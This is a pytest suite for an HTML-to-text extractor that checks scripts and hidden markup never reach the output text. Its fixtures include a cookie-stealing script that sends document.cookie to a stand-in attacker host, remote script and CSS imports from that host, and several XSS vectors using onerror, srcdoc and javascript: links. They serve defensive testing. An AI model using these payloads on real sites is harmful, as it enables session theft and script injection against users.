"""html_to_text: visible text only, never markup or script. Mail is synthetic."""

import pytest

from app.ingest.html_text import html_to_text

VENDOR_HTML = """<!DOCTYPE html>
<html><head><title>Job report</title>
<style>td { color: #D0202A }</style>
<script>document.location = "https://attacker.test/" + document.cookie</script>
</head><body>
<h1>Nightly server backup</h1>
<table>
<tr><th>Client</th><th>Status</th></tr>
<tr><td>Fictional&nbsp;Dental Clinic</td><td><b>Success</b></td></tr>
<tr><td>Example Freight Ltd</td><td><span style="color:red">Failed</span></td></tr>
</table>
<p>Processed: 12&nbsp;GB<br>Duration: 0:41:07</p>
<!-- tracking pixel --><img src="https://tracker.test/p.gif" onerror="alert(1)">
</body></html>"""


def test_a_vendor_report_keeps_its_words_in_rows() -> None:
    assert html_to_text(VENDOR_HTML) == (
        "Nightly server backup\n\n"
        "Client\tStatus\n"
        "Fictional Dental Clinic\tSuccess\n"
        "Example Freight Ltd\tFailed\n\n"
        "Processed: 12 GB\n"
        "Duration: 0:41:07"
    )


@pytest.mark.parametrize(
    "hostile",
    [
        "<script>alert(1)</script>",
        "<SCRIPT type=module>import('https://attacker.test/x.js')</SCRIPT>",
        "<style>@import url(https://attacker.test/x.css)</style>",
        "<template><img src=x onerror=alert(1)></template>",
        "<iframe srcdoc='<script>alert(1)</script>'>fallback</iframe>",
        "<svg><script>alert(1)</script><text>drawn</text></svg>",
        "<noscript><img src=x></noscript>",
        "<script>unclosed alert(1)",
    ],
)
def test_script_and_hidden_content_never_reach_the_text(hostile: str) -> None:
    text = html_to_text(f"<p>Before</p>{hostile}<p>After</p>")
    assert "alert" not in text and "attacker" not in text and "<" not in text
    assert text.startswith("Before")


def test_markup_is_gone_and_escaped_characters_stay_text() -> None:
    text = html_to_text(
        '<p onclick="steal()">Status: <a href="javascript:x">Warning</a></p>'
        "<p>&lt;script&gt;alert(1)&lt;/script&gt; &amp; more</p>"
    )
    # The second paragraph's source was text; it stays text, shown escaped.
    assert text == "Status: Warning\n\n<script>alert(1)</script> & more"
    assert "onclick" not in text and "javascript" not in text


def test_broken_markup_and_plain_text() -> None:
    assert html_to_text("no markup at all") == "no markup at all"
    assert html_to_text("<p>open <b>never closed") == "open never closed"
    assert html_to_text("</head></script>stray end tags") == "stray end tags"
    assert html_to_text("") == ""


def test_lists_breaks_and_spacing() -> None:
    html = "<ul><li>one</li><li>two</li></ul>a<br/>b<div>  lots   of\tspace </div>"
    assert html_to_text(html) == "one\ntwo\na\nb\nlots of space"
    assert html_to_text("<p>a</p><p></p><p></p><p>b</p>") == "a\n\nb"
    # A log in <pre> keeps its lines.
    log = "<pre>Copied 3 files\n\tSkipped 1</pre>"
    assert html_to_text(log) == "Copied 3 files\nSkipped 1"
